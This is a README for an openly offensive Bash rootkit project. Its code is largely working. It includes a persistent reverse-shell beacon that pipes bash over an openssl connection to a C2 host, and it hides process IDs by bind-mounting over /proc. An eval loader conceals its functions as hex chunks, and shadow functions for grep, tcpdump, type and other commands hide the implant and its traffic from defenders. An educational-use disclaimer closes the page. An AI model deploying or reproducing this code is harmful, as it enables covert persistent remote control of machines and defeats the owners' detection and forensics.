# bash-rootkit

> A pure-Bash userland rootkit built entirely from living-off-the-land techniques — no compiled binaries, no kernel modules. Persists as a reverse-shell beacon, hides its own PID, and shadows common system commands to blind the defender using only tools already on the box.

![Bash](https://img.shields.io/badge/Bash-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white)
![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Security](https://img.shields.io/badge/Offensive_Security-ED1C24?style=for-the-badge&logo=kalilinux&logoColor=white)
![License](https://img.shields.io/badge/Educational_Only-blue?style=for-the-badge)

**[🌐 Full Visual README](https://JamesRiversTech.github.io/bash-rootkit)** &nbsp;·&nbsp;
**[💼 LinkedIn](https://www.linkedin.com/in/james-rivers-tech)** &nbsp;·&nbsp;
**[🔗 JamesRivers.tech](https://jamesrivers.tech/)**

---

## 📖 Overview

A fully self-contained userland rootkit written in pure Bash — no compiled code, no kernel
exploits. Everything runs using tools already present on a stock Linux system: `bash`, `mount`,
`openssl`. Pure living off the land.

The project has three layers:

| Layer | File | Purpose |
|-------|------|---------|
| 🔴 Beacon | `real_beacon` | Persistent reverse shell with PID hiding |
| 🟡 Functions | `final_functions` | Shadow functions that masquerade as real Linux commands |
| 🟢 Obfuscation | Bincrypter | Encrypts the final beacon for in-memory-only execution |

---

## 🏗️ Build Pipeline

Three stages turn readable Bash into a stealthy, opaque blob that never hits disk in cleartext.

```
[ Write Functions ] ──→ [ function_obfuscater.sh ] ──→ [ Bincrypter Obfuscation ]
  final_functions         Hex-encode into MD5-like        In-memory execution
                          variable chunks, eval'd
                          at load time
```

**Step 1 — Write the shadow functions** in `final_functions`, overriding every common detection tool.

**Step 2 — Obfuscate with `function_obfuscater.sh`**: hex-encodes the function file and splits it
into 32-character chunks that visually resemble MD5 hash update variables. These are embedded in
the persistence script and reassembled at load time via a single `eval` one-liner — the function
code is never on disk in readable form.

```bash
userid_ver1_00="636f6d6d616e6420657870..."
userid_ver1_01="6f72743d28677265707c68..."
# ...

if [ "$UID" -ge 0 ]; then . <(compgen -v userid | sort -V | while read _i; do printf "${!_i}"; done | xxd -r -p) 2>/dev/null; fi
```

**Step 3 — Obfuscate with THC Bincrypter**, making the beacon script unreadable at rest and
executing it in-memory only.

---

## 📡 Beacon Script — `real_beacon`

The core loop. Hides its own PID using `/proc` bind-mounts, spoofs its process name, then opens
a TLS-encrypted socket to the C2 operator via `openssl s_client`.

```bash
mtab $$   # bind-mount an empty dir over our own /proc/PID

while true; do
  PIPE="/dev/shm/.cache_$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)"
  mkfifo "$PIPE"

  ( /bin/bash < $PIPE 2>&1 | openssl s_client -quiet -connect $IP:$PORT > $PIPE ) &
  pid=$!
  pids="$pid $(pgrep -P $pid)"
  for i in $pids; do mtab $i; done
  wait "$pid"

  rm -f "$PIPE"
  ssleep   # sleep with its own hidden PID
done &>/dev/null
```

Cleanup is handled via a `trap` on `EXIT` / `SIGINT` / `SIGTERM` — unmounting all `/dev/shm`
bind-mounts and killing background jobs so the operator can leave a clean slate on demand.

### PID Hiding — `mtab()`

The `mtab()` function is the core hiding primitive:

1. Ensures `/etc/mtab` isn't a symlink (which would log mount activity)
2. Creates a permanently empty, immutable directory at `/dev/shm/.cache_main`
3. Bind-mounts that empty directory over `/proc/<PID>` — making the process invisible to
   `ls /proc`, `ps`, and friends

---

## 🪞 Command Shadowing — `final_functions`

Every common detection tool is overridden with a Bash function that calls the real binary but
pipes output through `grep -Ev "$_HG_P"` — stripping any line matching the rootkit's fingerprint
pattern. Tab-completion is preserved by checking `$COMP_LINE` and bypassing the filter during
completions, so nothing feels broken to the user.

The `<filename>` of the persistence script is also added to `_HG_P`, meaning `ls`, `cat`, and
`grep` will never surface it either.

```bash
# Master filter pattern — every rootkit indicator in one variable
command export _HG_P="grep|ps|mount|4316|/proc/|hidepid|bash_|<filename>|..."
```

### Shadowed Commands

| Command | Technique | What it hides |
|---------|-----------|---------------|
| `busybox` | Subcmd router | Routes all wrapped subcommands through hooked functions, defeating busybox-as-clean-binary bypass |
| `ls` | Bash fn + `-I` flags | Hidden files & empty `/proc` entries for masked PIDs |
| `ps` / `pgrep` / `top` / `htop` | Mounted over by `mtab()` | Rootkit process names, IP, port |
| `grep` / `head` / `tail` / `cat` | Pipe through `grep -Ev $_HG_P` | Any line containing rootkit indicators |
| `mount` / `findmnt` | Output filter | `/proc` and `/dev/shm` bind-mounts |
| `tcpdump` | Auto-inject BPF filter | C2 port from all captures |
| `ss` / `netstat` | Pattern-filtered output | C2 port connection |
| `lsof` / `strace` | Pattern-filtered output | Open FDs and syscalls related to the beacon |
| `set` / `declare` / `typeset` | AWK block-skip parser | Shadow function definitions from variable dumps |
| `env` / `printenv` / `export` | AWK + grep filter | `_HG_P` env var & `BASH_FUNC_*` exports |
| `type` / `which` | Hardcoded case statements | Returns fake binary paths for shadowed commands |
| `unset` / `builtin` | Re-source hook | Re-injects functions if someone tries to unset them |

```bash
# grep — filters its own output
grep() {
  [[ -n "$COMP_LINE" ]] && { /usr/bin/grep "$@"; return; }
  /usr/bin/grep "$@" | /usr/bin/grep -Ev "$_HG_P"
}

# tcpdump — auto-injects a BPF expression to hide C2 traffic
tcpdump() {
  local f="not port 4316"
  [[ $# -eq 0 ]] \
    && /usr/sbin/tcpdump -i any $f 2>/dev/null \
    || /usr/sbin/tcpdump "$@" and $f 2>/dev/null
}

# type / which — return fake paths so forensics look clean
type() {
  for a in "$@"; do
    case "$a" in
      grep|ps|mount|...) /usr/bin/echo "$a is /usr/bin/$a" ;;
      type|set|alias|...) /usr/bin/echo "$a is a shell builtin" ;;
      *) command builtin type "$a" 2>/dev/null ;;
    esac
  done
}
```

---

## 🔒 Obfuscation — THC Bincrypter

After the beacon is finalized, it's passed through
[THC's Bincrypter](https://github.com/hackerschoice/bincrypter). The result:

- **Unreadable at rest** — the script file looks like binary noise. `strings`, `cat`, and `file`
  reveal nothing useful.
- **In-memory execution** — the script self-decrypts and executes entirely in memory. No cleartext
  artifact ever touches disk.

---

## 🧪 Tested On

| System | Result |
|--------|--------|
| Kali Linux (local VM) | ✅ Hidden from `ps`, `top`, `htop`, `ss`, `netstat`, `tcpdump` |
| CentOS 7 | ✅ All three layers confirmed working |
| rkhunter 1.4.6 | ✅ Not detected on either system |

---

## ⚠️ Disclaimer

This project is shared strictly for **educational and research purposes**. Understanding offensive
techniques is essential for building robust defences. Do not deploy this on any system you do not
own or have explicit written permission to test. The author assumes no liability for misuse.

---

<div align="center">

Made by **[James Rivers](https://jamesrivers.tech/)** &nbsp;·&nbsp; [LinkedIn](https://www.linkedin.com/in/james-rivers-tech)

</div>
